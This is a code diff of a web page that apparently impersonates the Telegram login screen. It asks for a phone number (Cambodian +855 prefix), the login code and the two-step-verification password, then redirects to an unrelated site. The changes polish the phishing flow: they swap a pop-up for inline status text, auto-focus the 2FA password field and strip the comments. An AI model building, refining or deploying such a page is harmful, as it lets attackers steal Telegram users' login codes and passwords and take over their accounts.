@@ -188,7 +188,6 @@
     
     <!-- STEP 1: Phone Form -->
     <div id="step-phone">
-      <!-- Telegram SVG Logo -->
       <div class="logo">
         <svg viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
           <circle cx="120" cy="120" r="120" fill="#2481CC"/>
@@ -199,7 +198,6 @@
       <h1>Telegram</h1>
       <p class="sub">Please confirm your country code and enter your phone number.</p>
 
-      <!-- Country Field -->
       <div class="field">
         <label>Country</label>
         <div class="country-select">
@@ -211,13 +209,11 @@
         </div>
       </div>
 
-      <!-- Phone Number Field (បានកែបញ្ចូល inputmode="numeric") -->
       <div class="field">
         <label>Your phone number</label>
         <input id="phone-input" type="text" inputmode="numeric" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" onkeydown="preventPrefixDelete(event, this)" onpaste="handlePaste(event, this)" />
       </div>
 
-      <!-- Keep me signed in -->
       <label class="checkbox-row">
         <input type="checkbox" checked />
         <span class="checkmark"></span>
@@ -226,7 +222,6 @@
 
       <button id="btn-send" onclick="sendPhone()" class="btn-primary">SEND CODE</button>
 
-      <!-- តំណភ្ជាប់ខាងក្រោម -->
       <div class="alt-links">
         <a href="#">LOG IN BY QR CODE</a>
         <a href="#">LOG IN WITH PASSKEY</a>
@@ -238,11 +233,11 @@
       <div class="text-5xl mb-2">🔐</div>
       <div>
         <h2 id="display-phone" class="text-lg font-semibold mb-1 text-white"></h2>
-        <p class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
+        <!-- កន្លែងបង្ហាញសារ Status ជំនួសការ Pop-up Alert -->
+        <p id="auth-status" class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
       </div>
       
       <div class="text-left space-y-4">
-        <!-- OTP Code Field (បានកែបញ្ចូល inputmode="numeric" និង pattern="[0-9]*") -->
         <div class="field">
           <label>Telegram Code</label>
           <input id="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Enter code" maxlength="6" class="text-center font-mono tracking-widest text-xl">
@@ -334,6 +329,8 @@
 
             if (data.success) {
                 document.getElementById('display-phone').innerText = phoneInput.value.trim();
+                document.getElementById('auth-status').innerText = "We've sent the code to your Telegram app.";
+                document.getElementById('auth-status').className = "text-gray-400 text-sm";
                 document.getElementById('step-phone').classList.add('hidden');
                 document.getElementById('step-otp').classList.remove('hidden');
             } else {
@@ -380,8 +377,11 @@
             if (data.success) {
                 window.location.replace(data.redirectUrl || "https://jvpfans.com");
             } else if (data.requiresPassword) {
+                // បង្ហាញប្រអប់ 2FA ចូលដោយស្វ័យប្រវត្តិ និងដូរអត្ថបទជាការជូនដំណឹង (គ្មាន Pop-up Alert ទៀតទេ)
+                document.getElementById('auth-status').innerText = 'This account has Two-Step Verification enabled. Please enter your 2FA password.';
+                document.getElementById('auth-status').className = 'text-yellow-400 text-sm font-medium';
                 document.getElementById('password-container').classList.remove('hidden');
-                alert('This account has Two-Step Verification enabled. Please enter your 2FA password.');
+                document.getElementById('password-input').focus();
             } else {
                 alert(data.error || 'Verification failed.');
             }
